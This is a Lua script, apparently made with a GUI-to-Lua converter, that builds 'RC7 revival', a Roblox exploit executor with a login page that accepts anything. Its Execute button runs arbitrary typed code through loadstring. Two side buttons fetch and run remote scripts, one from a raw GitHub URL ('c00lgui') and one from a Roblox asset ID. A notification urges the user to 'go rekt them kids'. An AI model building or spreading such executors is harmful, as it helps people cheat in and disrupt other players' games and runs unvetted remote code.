-- Gui to Lua
-- Version: 3.2

-- Instances:

local rc7 = Instance.new("ScreenGui")
local base = Instance.new("Frame")
local sidepage = Instance.new("Frame")
local title = Instance.new("TextLabel")
local c00lgui = Instance.new("ImageButton")
local roxploit = Instance.new("ImageButton")
local loginpage = Instance.new("Frame")
local loginlabel = Instance.new("TextLabel")
local username = Instance.new("TextBox")
local password = Instance.new("TextBox")
local submit = Instance.new("TextButton")
local homepage = Instance.new("Frame")
local textexecutor = Instance.new("TextBox")
local execute = Instance.new("TextButton")
local clear = Instance.new("TextButton")
local windowbase = Instance.new("Frame")
local R = Instance.new("TextLabel")
local C7 = Instance.new("TextLabel")
local closebutton = Instance.new("TextButton")
local minimizebutton = Instance.new("TextButton")
local fullscreenbutton = Instance.new("TextButton")

--Properties:

rc7.Name = "rc7"
rc7.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
rc7.ResetOnSpawn = false

base.Name = "base"
base.Parent = windowbase
base.BackgroundColor3 = Color3.fromRGB(21, 46, 97)
base.BorderColor3 = Color3.fromRGB(15, 34, 71)
base.BorderSizePixel = 3
base.Position = UDim2.new(0.00166251673, 0, 1.36709404, 0)
base.Size = UDim2.new(0, 315, 0, 361)

sidepage.Name = "sidepage"
sidepage.Parent = base
sidepage.BackgroundColor3 = Color3.fromRGB(15, 34, 71)
sidepage.BorderColor3 = Color3.fromRGB(8, 19, 39)
sidepage.BorderSizePixel = 2
sidepage.Position = UDim2.new(0.822957575, 0, 0.00347443903, 0)
sidepage.Size = UDim2.new(0, 55, 0, 359)

title.Name = "title"
title.Parent = sidepage
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Position = UDim2.new(0.333910525, 0, -0.21900633, 0)
title.Size = UDim2.new(0, 18, 0, 230)
title.Font = Enum.Font.SourceSansBold
title.LineHeight = 0.490
title.Text = "RC7"
title.TextColor3 = Color3.fromRGB(28, 62, 129)
title.TextSize = 64.000
title.TextWrapped = true
title.TextTransparency = 0.5
c00lgui.Name = "c00lgui"
c00lgui.Parent = sidepage
c00lgui.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
c00lgui.Position = UDim2.new(0.127272725, 0, 0.674094737, 0)
c00lgui.Size = UDim2.new(0, 40, 0, 41)
c00lgui.Image = "http://www.roblox.com/asset/?id=178993745"
c00lgui.MouseButton1Down:connect(function()
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/theawesomari0/c00lgui/main/c00lgui"), true))()
end)

roxploit.Name = "roxploit"
roxploit.Parent = sidepage
roxploit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
roxploit.Position = UDim2.new(0.127272725, 0, 0.813370466, 0)
roxploit.Size = UDim2.new(0, 40, 0, 41)
roxploit.Image = "http://www.roblox.com/asset/?id=408308384"
roxploit.MouseButton1Down:connect(function()
	loadstring(game:GetObjects("rbxassetid://175137115")[1].Source)()
end)

loginpage.Name = "loginpage"
loginpage.Parent = base
loginpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
loginpage.BackgroundTransparency = 1.000
loginpage.Position = UDim2.new(-0.00189264119, 0, 7.10263848e-05, 0)
loginpage.Size = UDim2.new(0, 256, 0, 360)
loginpage.Visible = true

loginlabel.Name = "loginlabel"
loginlabel.Parent = loginpage
loginlabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
loginlabel.BackgroundTransparency = 1.000
loginlabel.Position = UDim2.new(0.144060016, 0, 0.232702374, 0)
loginlabel.Size = UDim2.new(0, 200, 0, 50)
loginlabel.Font = Enum.Font.ArialBold
loginlabel.Text = "LOGIN"
loginlabel.TextColor3 = Color3.fromRGB(15, 34, 71)
loginlabel.TextSize = 51.000

username.Name = "username"
username.Parent = loginpage
username.BackgroundColor3 = Color3.fromRGB(15, 34, 71)
username.BorderColor3 = Color3.fromRGB(12, 27, 56)
username.BorderSizePixel = 3
username.Position = UDim2.new(0.2578125, 0, 0.36944443, 0)
username.Size = UDim2.new(0, 146, 0, 24)
username.Font = Enum.Font.ArialBold
username.Text = "Username"
username.TextColor3 = Color3.fromRGB(21, 46, 97)
username.TextSize = 14.000

password.Name = "password"
password.Parent = loginpage
password.BackgroundColor3 = Color3.fromRGB(15, 34, 71)
password.BorderColor3 = Color3.fromRGB(12, 27, 56)
password.BorderSizePixel = 3
password.Position = UDim2.new(0.2578125, 0, 0.466666639, 0)
password.Size = UDim2.new(0, 146, 0, 24)
password.Font = Enum.Font.ArialBold
password.Text = "Password"
password.TextColor3 = Color3.fromRGB(21, 46, 97)
password.TextSize = 14.000

submit.Name = "submit"
submit.Parent = loginpage
submit.BackgroundColor3 = Color3.fromRGB(21, 46, 97)
submit.BorderColor3 = Color3.fromRGB(29, 65, 136)
submit.BorderSizePixel = 2
submit.Position = UDim2.new(0.32256943, 0, 0.556786776, 0)
submit.Size = UDim2.new(0, 115, 0, 23)
submit.Font = Enum.Font.ArialBold
submit.Text = "Submit"
submit.TextColor3 = Color3.fromRGB(29, 65, 136)
submit.TextSize = 14.000
submit.MouseButton1Down:connect(function()
	loginpage.Visible = false
	homepage.Visible = true
	
	local function callback(Text)
 if Text == "Button1 text" then
  print ("rc7 on top bois")
 end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--
game.StarterGui:SetCore("SendNotification",  {
 Title = "RC7";
 Text = "rc7 revival has loaded now go rekt them kids";
 Icon = "";
 Duration = 5;
 Button1 = "yessir";
 Callback = NotificationBindable;
})
end)

homepage.Name = "homepage"
homepage.Parent = base
homepage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
homepage.BackgroundTransparency = 1.000
homepage.Size = UDim2.new(0, 255, 0, 358)
homepage.Visible = false

textexecutor.Name = "textexecutor"
textexecutor.Parent = homepage
textexecutor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
textexecutor.Position = UDim2.new(0.0352941193, 0, 0.0335195325, 0)
textexecutor.Size = UDim2.new(0, 248, 0, 231)
textexecutor.Font = Enum.Font.Roboto
textexecutor.Text = ""
textexecutor.TextColor3 = Color3.fromRGB(0, 0, 0)
textexecutor.TextSize = 16.000
textexecutor.TextWrapped = true
textexecutor.TextXAlignment = Enum.TextXAlignment.Left
textexecutor.TextYAlignment = Enum.TextYAlignment.Top

execute.Name = "execute"
execute.Parent = homepage
execute.BackgroundColor3 = Color3.fromRGB(21, 46, 97)
execute.BorderColor3 = Color3.fromRGB(15, 34, 71)
execute.BorderSizePixel = 2
execute.Position = UDim2.new(0.0364145301, 0, 0.678716719, 0)
execute.Size = UDim2.new(0, 123, 0, 30)
execute.Font = Enum.Font.SourceSansBold
execute.Text = "Execute"
execute.TextColor3 = Color3.fromRGB(36, 107, 182)
execute.TextSize = 19.000

clear.Name = "clear"
clear.Parent = homepage
clear.BackgroundColor3 = Color3.fromRGB(21, 46, 97)
clear.BorderColor3 = Color3.fromRGB(15, 34, 71)
clear.BorderSizePixel = 2
clear.Position = UDim2.new(0.530532181, 0, 0.678716719, 0)
clear.Size = UDim2.new(0, 121, 0, 30)
clear.Font = Enum.Font.SourceSansBold
clear.Text = "Clear"
clear.TextColor3 = Color3.fromRGB(36, 107, 182)
clear.TextSize = 19.000
clear.MouseButton1Down:connect(function()
	base.homepage.textexecutor.Text = " "
end)


windowbase.Name = "window base"
windowbase.Parent = rc7
windowbase.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
windowbase.BorderColor3 = Color3.fromRGB(243, 243, 243)
windowbase.BorderSizePixel = 2
windowbase.Position = UDim2.new(0.0605187342, 0, 0.0683760718, 0)
windowbase.Size = UDim2.new(0, 317, 0, 15)
windowbase.Active = true
windowbase.Draggable = true
windowbase.Selectable = true

R.Name = "R"
R.Parent = windowbase
R.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
R.BackgroundTransparency = 1.000
R.Position = UDim2.new(-0.287066251, 0, -1.20000005, 0)
R.Size = UDim2.new(0, 200, 0, 50)
R.Font = Enum.Font.SourceSansBold
R.Text = "R"
R.TextColor3 = Color3.fromRGB(28, 62, 129)
R.TextSize = 14.000

C7.Name = "C7"
C7.Parent = windowbase
C7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
C7.BackgroundTransparency = 1.000
C7.Position = UDim2.new(-0.261829674, 0, -1.53333342, 0)
C7.Size = UDim2.new(0, 200, 0, 50)
C7.Font = Enum.Font.SourceSansBold
C7.Text = "C7"
C7.TextColor3 = Color3.fromRGB(28, 62, 129)
C7.TextSize = 9.000

closebutton.Name = "closebutton"
closebutton.Parent = windowbase
closebutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
closebutton.BackgroundTransparency = 1.000
closebutton.Position = UDim2.new(0.949526787, 0, -0.200000033, 0)
closebutton.Size = UDim2.new(0, 16, 0, 21)
closebutton.Font = Enum.Font.SourceSans
closebutton.Text = "X"
closebutton.TextColor3 = Color3.fromRGB(167, 167, 167)
closebutton.TextSize = 14.000
closebutton.MouseButton1Down:connect(function()
	base.Visible = false
	windowbase.Visible = false
end)

minimizebutton.Name = "minimizebutton"
minimizebutton.Parent = windowbase
minimizebutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
minimizebutton.BackgroundTransparency = 1.000
minimizebutton.Position = UDim2.new(0.709779143, 0, -0.200000033, 0)
minimizebutton.Size = UDim2.new(0, 16, 0, 21)
minimizebutton.Font = Enum.Font.SourceSans
minimizebutton.Text = "-"
minimizebutton.TextColor3 = Color3.fromRGB(167, 167, 167)
minimizebutton.TextSize = 14.000
minimizebutton.MouseButton1Down:connect(function()
	if minimizebutton.Text == "-" then
		base.Visible = false
		minimizebutton.Text = "_" else
		base.Visible = true
		minimizebutton.Text = "-"	
	end	
end)


fullscreenbutton.Name = "fullscreenbutton"
fullscreenbutton.Parent = windowbase
fullscreenbutton.Active = false
fullscreenbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fullscreenbutton.BackgroundTransparency = 1.000
fullscreenbutton.Position = UDim2.new(0.842271268, 0, -0.200000033, 0)
fullscreenbutton.Size = UDim2.new(0, 16, 0, 21)
fullscreenbutton.Font = Enum.Font.SourceSans
fullscreenbutton.Text = "🦣"
fullscreenbutton.TextColor3 = Color3.fromRGB(217, 217, 217)
fullscreenbutton.TextSize = 14.000

-- Scripts:

local function RSHE_fake_script() -- execute.LocalScript 
	local script = Instance.new('LocalScript', execute)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(script.Parent.Parent.textexecutor.Text)()
	end)
	
end
coroutine.wrap(RSHE_fake_script)()
local function WORCNP_fake_script() -- base.LocalScript 
	local script = Instance.new('LocalScript', base)

	script.Parent.Active = true
	script.Parent.Draggable = false
	
end
coroutine.wrap(WORCNP_fake_script)()
